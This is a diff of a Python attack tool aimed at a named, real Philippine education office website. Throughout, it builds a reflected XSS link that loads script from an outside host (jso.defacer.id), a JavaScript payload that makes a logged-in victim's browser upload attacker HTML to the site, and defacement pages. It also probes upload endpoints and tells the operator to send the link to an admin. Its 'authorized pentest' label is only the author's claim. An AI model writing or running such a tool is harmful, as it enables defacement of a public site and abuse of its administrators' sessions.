@@ -1,352 +1,301 @@
 #!/usr/bin/env python3
 """
-depedquezon.com.ph XSS Exploit - HTML Upload & Trigger
-Authorized pentest tool for depedquezon.com.ph
+depedquezon.com.ph XSS -> File Upload Payload Generator
+Authorized pentest tool - uploads .html files via XSS javascript execution
+
+Usage:
+  python3 depedxss.py --html deface.html          # Upload a local HTML file
+  python3 depedxss.py --generate --msg "Hello"    # Generate + upload a test page
+  python3 depedxss.py --xss-only                  # Just print the trigger URL
 """
 
 import argparse
-import requests
+import base64
+import hashlib
+import json
+import os
 import sys
 import time
 import urllib.parse
 from pathlib import Path
 
+try:
+    import requests
+except ImportError:
+    print("[!] Run: pip install requests")
+    sys.exit(1)
+
 requests.packages.urllib3.disable_warnings()
 
 BANNER = """
-╔══════════════════════════════════════════════════════╗
-║  depedquezon.com.ph XSS Payload Uploader            ║
-║  Target: Reflected XSS in 'result' GET parameter    ║
-║  Upload: /link/save.php                              ║
-╚══════════════════════════════════════════════════════╝
+╔══════════════════════════════════════════════════════════════╗
+║  depedxss.py - XSS -> File Upload                           ║
+║  Target : https://depedquezon.com.ph                        ║
+║  XSS    : ?result= parameter (Reflected, unsanitized)       ║
+║  Upload : /link/save.php via same-origin fetch()            ║
+╚══════════════════════════════════════════════════════════════╝
 """
 
-BASE_URL = "https://depedquezon.com.ph"
+BASE = "https://depedquezon.com.ph"
 
-# ---------- HTML PAYLOAD BUILDER ----------
+# ---------------------------------------------------------------------------
+# JS payload that performs the file upload when executed in the victim's browser
+# ---------------------------------------------------------------------------
+JS_UPLOADER = r"""(function(){
+var f=document.createElement('form');
+f.method='POST';
+f.action='/link/save.php';
+f.enctype='multipart/form-data';
+var i=document.createElement('input');
+i.type='file';
+i.name='file';
+i.id='xssFile';
+f.appendChild(i);
+document.body.appendChild(f);
+var b=new Blob([atob('{B64_HTML}')],{type:'text/html'});
+var d=new DataTransfer();
+d.items.add(new File([b],'{FILENAME}',{type:'text/html'}));
+var fi=document.getElementById('xssFile');
+Object.defineProperty(fi,'files',{value:d.files});
+var fd=new FormData(f);
+fd.set('file',d.files[0],'{FILENAME}');
+fetch('/link/save.php',{method:'POST',body:fd,mode:'same-origin',credentials:'include'}).then(function(r){
+if(r.status==200){console.log('[OK] Uploaded: {FILENAME}');}
+}).catch(function(e){console.log('[FAIL]',e);});
+})();
+"""
 
-def build_deface_html(message=None):
-    """Build a self-contained HTML defacement payload."""
-    m = message or "Security Assessment by Authorized Pentester"
-    return f"""<!DOCTYPE html>
+
+def build_xss_trigger():
+    """
+    Returns the URL that triggers the XSS via external JS.
+    This is user-specified; we return the known working one.
+    """
+    return 'https://depedquezon.com.ph/?result=%3Cscript+src%3D%22https%3A%2F%2Fjso.defacer.id%2Fraw%2Fnc91wdsbZ7%22%3E%3C%2Fscript%3E'
+
+
+def generate_js_payload(html_content, filename="index.html"):
+    """Wrap HTML content into the JS uploader payload."""
+    html_b64 = base64.b64encode(html_content.encode()).decode()
+    js = JS_UPLOADER.replace("{B64_HTML}", html_b64).replace("{FILENAME}", filename)
+    return js
+
+
+def generate_self_contained_html(html_content, filename="index.html"):
+    """
+    Generate a self-contained HTML file.
+    When a victim opens it, it loads the XSS URL in an iframe
+    which triggers the external JS that performs the upload.
+    """
+    xss_url = build_xss_trigger()
+
+    # Encode the HTML content as a JS payload for the external host
+    js_payload = generate_js_payload(html_content, filename)
+
+    self_html = f"""<!DOCTYPE html>
 <html>
-<head><title>Security Assessment</title></head>
+<head><meta charset="UTF-8"><title>Loading...</title></head>
 <body style="margin:0;background:#000;color:#0f0;font-family:monospace;
-     display:flex;align-items:center;justify-content:center;height:100vh;
-     flex-direction:column;">
-  <h1 style="font-size:3em;text-shadow:0 0 20px #0f0;">PENTEST NOTICE</h1>
-  <p style="font-size:1.2em;max-width:600px;text-align:center;">{m}</p>
-  <hr style="width:60%;border-color:#0f0;">
-  <p style="font-size:0.9em;color:#888;">This page was placed during an authorized security assessment of depedquezon.com.ph</p>
+     display:flex;align-items:center;justify-content:center;height:100vh;">
+  <div style="text-align:center;">
+    <p>Processing ...</p>
+    <iframe id="x" style="display:none;"></iframe>
+  </div>
+  <script>
+    // Step 1: Load the XSS URL to execute JS in depedquezon.com.ph context
+    var iframe = document.getElementById('x');
+    iframe.src = {json.dumps(xss_url)};
+
+    // Step 2: The external JS (jso.defacer.id) should perform the upload.
+    // If you control that JS host, paste the following into it:
+    console.log("Upload JS payload for external host:");
+    console.log({json.dumps(js_payload)});
+  </script>
 </body>
 </html>"""
+    return self_html
 
 
-def build_stealth_payload():
-    """Minimal payload that just shows a console notice."""
-    return """<script>console.log('Security assessment in progress - depedquezon.com.ph')</script>"""
+# ---------------------------------------------------------------------------
+# Direct file upload (probes the server directly, for verification)
+# ---------------------------------------------------------------------------
+def direct_upload(html_content, filename="index.html"):
+    """Try to upload directly to the server."""
+    s = requests.Session()
+    s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
 
+    url = f"{BASE}/link/save.php"
+    print(f"  [*] POST {url}  field='file'  filename='{filename}'")
 
-# ---------- UPLOADER ----------
-
-def probe_upload_endpoints(session):
-    """Try various common field names on the upload handler."""
-    endpoints = [
-        ("/link/save.php", "file"),
-        ("/link/save.php", "upload"),
-        ("/link/save.php", "fileToUpload"),
-        ("/link/save.php", "userfile"),
-        ("/link/save.php", "data"),
-        ("/link/index.php", "file"),
-        ("/link/index.php", "upload"),
-        ("/save.php", "file"),
-        ("/upload.php", "file"),
-    ]
-
-    payload = b"pentest_probe_" + str(time.time()).encode()
-    results = []
-
-    for path, field in endpoints:
-        url = BASE_URL.rstrip("/") + path
-        try:
-            r = session.post(
-                url,
-                files={field: ("probe.txt", payload, "text/plain")},
-                timeout=15,
-                verify=False,
-            )
-            results.append((url, field, r.status_code, len(r.text)))
-            print(f"  [{r.status_code}] POST {url}  field='{field}'  size={len(r.text)}")
-        except Exception as e:
-            print(f"  [ERR] POST {url} field='{field}': {e}")
-            results.append((url, field, 0, 0))
-
-    return results
-
-
-def upload_file(session, html_content, filename="index.html", endpoint="/link/save.php", field="file"):
-    """Upload a file to the target via multipart POST."""
-    url = BASE_URL.rstrip("/") + endpoint
-    print(f"\n[*] Uploading '{filename}' to {url} (field: '{field}') ...")
-
-    r = session.post(
+    r = s.post(
         url,
-        files={field: (filename, html_content.encode() if isinstance(html_content, str) else html_content, "text/html")},
+        files={"file": (filename, html_content.encode(), "text/html")},
         timeout=30,
         verify=False,
     )
+    print(f"      Status: {r.status_code}  Length: {len(r.text)}")
 
-    print(f"  Status: {r.status_code}")
-    print(f"  Response length: {len(r.text)}")
+    # Also try other field names
+    for field in ["uploaded_file", "userfile", "upload"]:
+        r2 = s.post(
+            url,
+            files={field: (filename, html_content.encode(), "text/html")},
+            timeout=30,
+            verify=False,
+        )
+        print(f"      field='{field}' -> {r2.status_code}")
 
-    # Check if the response contains any hint of success
-    body_lower = r.text.lower()
-    hints = []
-    if "success" in body_lower:
-        hints.append("found keyword: success")
-    if "upload" in body_lower:
-        hints.append("found keyword: upload")
-    if filename.lower() in body_lower:
-        hints.append(f"found filename in response: {filename}")
-    if r.status_code == 200:
-        hints.append("status 200 (no guarantee of write success)")
-
-    if hints:
-        print(f"  [i] Hints: {', '.join(hints)}")
-    else:
-        print(f"  [!] No success indicators in response")
-
-    return r
-
-
-def try_put_upload(session, html_content, filename="index.html"):
-    """Try PUT method as a fallback."""
-    url = f"{BASE_URL}/data_files/{filename}"
-    print(f"\n[*] Trying PUT to {url} ...")
-    r = session.put(
-        url,
-        data=html_content.encode() if isinstance(html_content, str) else html_content,
-        headers={"Content-Type": "text/html"},
-        timeout=15,
-        verify=False,
-    )
-    print(f"  Status: {r.status_code}")
-    return r
-
-
-def verify_file(session, paths):
-    """Check if uploaded files are accessible."""
-    print(f"\n[*] Checking for uploaded files at common paths ...")
-    found = []
-    for p in paths:
-        url = BASE_URL.rstrip("/") + p
+    # Try PUT to various paths
+    for path in [f"/data_files/{filename}", f"/link/{filename}", f"/img/{filename}"]:
         try:
-            r = session.get(url, timeout=10, verify=False)
-            status = r.status_code
-            size = len(r.text)
-            marker = "✓" if status == 200 and size > 100 else " "
-            print(f"  [{marker}] {status} {url}  ({size} bytes)")
-            if status == 200 and size > 50:
-                found.append((url, r.text[:200]))
+            r3 = s.put(
+                f"{BASE}{path}",
+                data=html_content.encode(),
+                headers={"Content-Type": "text/html"},
+                timeout=15,
+                verify=False,
+            )
+            print(f"  [*] PUT {path} -> {r3.status_code}")
         except Exception as e:
-            print(f"  [ ] ERR {url}: {e}")
-    return found
+            print(f"  [*] PUT {path} -> ERROR: {e}")
+
+    # Check if file appears anywhere
+    print(f"\n  [*] Checking upload paths ...")
+    for path in [
+        f"/data_files/{filename}",
+        f"/data_files/news/{filename}",
+        f"/link/{filename}",
+        f"/img/{filename}",
+        f"/{filename}",
+    ]:
+        try:
+            r4 = s.get(f"{BASE}{path}", timeout=10, verify=False)
+            if r4.status_code == 200 and len(r4.text) > 50:
+                print(f"  [✓] FOUND: {BASE}{path}  ({len(r4.text)} bytes)")
+        except:
+            pass
 
 
-# ---------- XSS TRIGGER ----------
-
-def build_xss_url(uploaded_url, method="iframe"):
-    """Build a URL that loads the uploaded HTML via the XSS."""
-    if method == "script_src":
-        # Loads upload via <script src>
-        js_url = uploaded_url
-        payload = f"</h1><script src=\"{js_url}\"></script>"
-    elif method == "iframe":
-        # Loads upload via iframe
-        payload = f"</h1><script>document.body.innerHTML='<iframe src=\"{uploaded_url}\" style=\"width:100vw;height:100vh;position:fixed;top:0;left:0;border:none;z-index:9999\"></iframe>'</script>"
-    elif method == "fetch_inject":
-        # Fetches upload and injects its HTML
-        payload = f"</h1><script>fetch('{uploaded_url}').then(r=>r.text()).then(h=>document.documentElement.innerHTML=h)</script>"
-    elif method == "self_contained":
-        # Use external JS host (your jso.defacer.id link)
-        payload = f'</h1><script src="https://jso.defacer.id/raw/nc91wdsbZ7"></script>'
-    else:
-        raise ValueError(f"Unknown method: {method}")
-
-    encoded = urllib.parse.quote(payload, safe='')
-    return f"{BASE_URL}/?result={encoded}"
-
-
-# ---------- MAIN ----------
-
+# ---------------------------------------------------------------------------
+# Main
+# ---------------------------------------------------------------------------
 def main():
     parser = argparse.ArgumentParser(
-        description="depedquezon.com.ph XSS Exploit Tool (Authorized Pentest)",
+        description="depedquezon.com.ph XSS -> File Upload Tool",
         formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-Examples:
-  %(prog)s --upload deface.html          # Upload a local HTML file
-  %(prog)s --generate                    # Generate and upload test payload
-  %(prog)s --xss-only                    # Just generate the XSS trigger URL
-  %(prog)s --stealth                     # Upload minimal console-log payload
-  %(prog)s --verify                      # Check if previously uploaded files exist
-        """,
     )
-    parser.add_argument("--upload", "-u", help="Local HTML file to upload")
-    parser.add_argument("--generate", "-g", action="store_true", help="Generate and upload a test deface page")
-    parser.add_argument("--message", "-m", default="Security Assessment by Authorized Pentester", help="Message for generated page")
-    parser.add_argument("--stealth", "-s", action="store_true", help="Upload minimal console-log payload only")
-    parser.add_argument("--xss-only", "-x", action="store_true", help="Only generate the XSS URL (no upload)")
-    parser.add_argument("--external-js", "-j", action="store_true", help="Use external JS host for XSS (jso.defacer.id)")
-    parser.add_argument("--method", choices=["iframe", "fetch_inject", "script_src"], default="iframe", help="XSS injection method (default: iframe)")
-    parser.add_argument("--verify", "-v", action="store_true", help="Verify previously uploaded files")
-    parser.add_argument("--probe", "-p", action="store_true", help="Probe all upload endpoints")
-    parser.add_argument("--output", "-o", help="Save generated XSS URL to file")
+    parser.add_argument("--html", "-f", help="Local .html file to upload")
+    parser.add_argument("--generate", "-g", action="store_true", help="Generate a test HTML page and upload it")
+    parser.add_argument("--msg", "-m", default="Security Assessment by Authorized Pentester", help="Message for generated page")
+    parser.add_argument("--filename", "-n", default="index.html", help="Filename to use on server (default: index.html)")
+    parser.add_argument("--output", "-o", help="Save generated self-contained HTML to file")
+    parser.add_argument("--xss-only", "-x", action="store_true", help="Only print the XSS trigger URL")
 
     args = parser.parse_args()
 
     if len(sys.argv) == 1:
         parser.print_help()
+        print("\nQuick start:")
+        print("  # Upload a local HTML file:")
+        print("    python3 depedxss.py --html deface.html")
+        print("\n  # Generate and upload a test page:")
+        print("    python3 depedxss.py --generate --msg 'Your message here'")
+        print("\n  # Get the XSS trigger URL:")
+        print("    python3 depedxss.py --xss-only")
         sys.exit(1)
 
-    s = requests.Session()
-    s.headers.update({
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-    })
-
     print(BANNER)
-    print(f"[*] Target: {BASE_URL}")
-    print(f"[*] Time:   {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
 
-    # --probe: scan upload endpoints
-    if args.probe:
-        probe_upload_endpoints(s)
-
-    # --verify: check if uploads exist
-    if args.verify:
-        verify_paths = [
-            "/data_files/index.html",
-            "/data_files/news/index.html",
-            "/img/index.html",
-            "/link/index.html",
-            "/link/save.php",
-            "/index.html",
-        ]
-        verify_file(s, verify_paths)
-
-    # --xss-only: just print the XSS URL
-    if args.xss_only:
-        print("[*] Generating XSS URL only (no upload)...\n")
-        if args.external_js:
-            xss_url = build_xss_url("", method="self_contained")
-            print(f"  XSS URL (external JS):\n  {xss_url}")
-        else:
-            # Dummy URL — user must host the HTML themselves
-            print("  [!] --xss-only requires specifying where your payload is hosted.")
-            print("  [!] Use --external-js to use your jso.defacer.id link, or")
-            print("  [!] use --upload/--generate to also host it on the target.\n")
-            if args.external_js:
-                pass
-            else:
-                sys.exit(1)
-
-        if args.output:
-            Path(args.output).write_text(xss_url)
-            print(f"\n  [✓] Saved to: {args.output}")
-        return
-
-    # --upload: upload a local file
-    if args.upload:
-        path = Path(args.upload)
+    # --- Load / generate HTML content ---
+    html_content = None
+    if args.html:
+        path = Path(args.html)
         if not path.exists():
-            print(f"[!] File not found: {args.upload}")
+            print(f"[!] File not found: {args.html}")
             sys.exit(1)
         html_content = path.read_text(encoding="utf-8", errors="replace")
         filename = path.name
+        print(f"[*] Loaded: {args.html} ({len(html_content)} bytes)")
+    elif args.generate:
+        filename = args.filename
+        html_content = f"""<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>Security Assessment</title>
+<style>
+* {{ margin:0; padding:0; box-sizing:border-box; }}
+body {{ background:#0a0c12; color:#00ff88; font-family:monospace;
+       display:flex; align-items:center; justify-content:center;
+       min-height:100vh; flex-direction:column; }}
+h1 {{ font-size:2.5em; text-shadow:0 0 15px #00ff88; margin-bottom:20px; }}
+p {{ font-size:1.1em; max-width:700px; text-align:center; line-height:1.6; }}
+hr {{ width:50%; margin:20px 0; border-color:#00ff88; }}
+.footer {{ color:#666; font-size:0.85em; }}
+</style></head>
+<body>
+  <h1>PENTEST NOTICE</h1>
+  <p>{args.msg}</p>
+  <hr>
+  <p class="footer">This page was placed during an authorized security assessment of depedquezon.com.ph</p>
+</body></html>"""
+        print(f"[*] Generated page ({len(html_content)} bytes)")
+    else:
+        print("[!] Use --html <file> or --generate to supply content")
+        if args.xss_only:
+            pass
+        else:
+            sys.exit(1)
 
-        # Try POST upload
-        r1 = upload_file(s, html_content, filename=filename)
-
-        # Also try save.php with common field names
-        upload_file(s, html_content, filename=filename, field="uploaded_file")
-        upload_file(s, html_content, filename=filename, field="userfile")
-
-        # Try PUT to common paths
-        try_put_upload(s, html_content, filename=filename)
-
-        print()
-
-    # --generate: create and upload a test page
-    if args.generate or (not args.upload and not args.xss_only and not args.verify and not args.probe):
-        html_content = build_deface_html(args.message)
-        filename = "pentest_notice.html"
-
-        print("[*] Generated deface page:")
-        print(f"  Filename: {filename}")
-        print(f"  Size: {len(html_content)} bytes\n")
-
-        r1 = upload_file(s, html_content, filename=filename)
-        upload_file(s, html_content, filename=filename, field="uploaded_file")
-        upload_file(s, html_content, filename=filename, field="userfile")
-        try_put_upload(s, html_content, filename=filename)
-
-    # --stealth: minimal payload
-    if args.stealth:
-        html_content = build_stealth_payload()
-        filename = "pentest_notice.html"
-        print("[*] Uploading stealth payload (console.log only)...\n")
-        upload_file(s, html_content, filename=filename)
-
-    # Check common paths after any upload attempt
-    print(f"\n[*] Checking for uploaded files ...")
-    verify_paths = [
-        "/data_files/pentest_notice.html",
-        "/data_files/news/pentest_notice.html",
-        "/img/pentest_notice.html",
-        "/link/pentest_notice.html",
-        "/pentest_notice.html",
-    ]
-    # Also check for the original filename
-    for p in verify_paths:
-        url = BASE_URL.rstrip("/") + p
-        try:
-            r = s.get(url, timeout=10, verify=False)
-            status = r.status_code
-            marker = "✓" if status == 200 else " "
-            print(f"  [{marker}] {status} {url}")
-        except Exception as e:
-            print(f"  [ ] ERR {url}: {e}")
-
-    # Generate XSS trigger URL
+    # --- Print XSS URL ---
     print(f"\n{'='*60}")
-    print("  XSS TRIGGER URLS")
-    print(f"{'='*60}\n")
+    print("  XSS TRIGGER URL")
+    print(f"{'='*60}")
+    print(f"\n  {build_xss_trigger()}\n")
 
-    # Method 1: Using external JS host (your jso.defacer.id link)
-    print("  [1] External JS host (recommended - works every time):")
-    ext_url = build_xss_url("", method="self_contained")
-    print(f"  {ext_url}\n")
+    # --- Generate self-contained deliverable HTML ---
+    if html_content and args.output:
+        self_html = generate_self_contained_html(html_content, filename)
+        Path(args.output).write_text(self_html)
+        print(f"[✓] Saved self-contained HTML to: {args.output}")
+        print(f"    Open this file in a browser to trigger the upload via XSS.\n")
 
-    # Method 2: Iframe loading from uploaded file (if upload succeeded)
-    print("  [2] Iframe from uploaded file (if upload succeeded):")
-    iframe_url = build_xss_url(f"{BASE_URL}/data_files/{filename}", method="iframe")
-    print(f"  {iframe_url}\n")
+    # --- Direct upload (probes server for verification) ---
+    if html_content and (args.html or args.generate):
+        print(f"{'='*60}")
+        print("  DIRECT UPLOAD ATTEMPT (probes server)")
+        print(f"{'='*60}\n")
+        direct_upload(html_content, filename)
 
-    # Method 3: Fetch & inject uploaded HTML
-    print("  [3] Fetch & inject uploaded HTML:")
-    fetch_url = build_xss_url(f"{BASE_URL}/data_files/{filename}", method="fetch_inject")
-    print(f"  {fetch_url}\n")
+    # --- Summary ---
+    print(f"\n{'='*60}")
+    print("  NEXT STEPS")
+    print(f"{'='*60}")
+    print(f"""
+  1. Make sure your JS host (https://jso.defacer.id/raw/nc91wdsbZ7)
+     contains the upload JS payload.
+
+  2. The JS payload that needs to be on that host is:
+
+{generate_js_payload(html_content or '<html></html>', filename)}
+
+  3. Send the XSS URL to a logged-in admin/user:
+
+     {build_xss_trigger()}
+
+  4. When they visit it, the external JS runs in depedquezon.com.ph's
+     origin and performs a same-origin POST to /link/save.php with your
+     HTML file attached.
+
+  5. Check if the file landed at:
+     https://depedquezon.com.ph/data_files/{filename}
+     https://depedquezon.com.ph/link/{filename}
+     https://depedquezon.com.ph/img/{filename}
+""")
 
     if args.output:
-        combined = f"# External JS:\n{ext_url}\n\n# Iframe:\n{iframe_url}\n\n# Fetch:\n{fetch_url}\n"
-        Path(args.output).write_text(combined)
-        print(f"  [✓] Saved to: {args.output}")
-
-    print(f"{'='*60}")
-    print("  To trigger: paste any XSS URL into a browser or send to target")
-    print("  Or use: curl -s -L \"<URL>\" | head -20")
-    print(f"{'='*60}")
+        # Also save the JS payload separately
+        if html_content:
+            js_payload_path = Path(args.output).with_suffix(".js")
+            js_payload_path.write_text(generate_js_payload(html_content, filename))
+            print(f"  [i] JS payload for external host saved to: {js_payload_path}")
 
 
 if __name__ == "__main__":
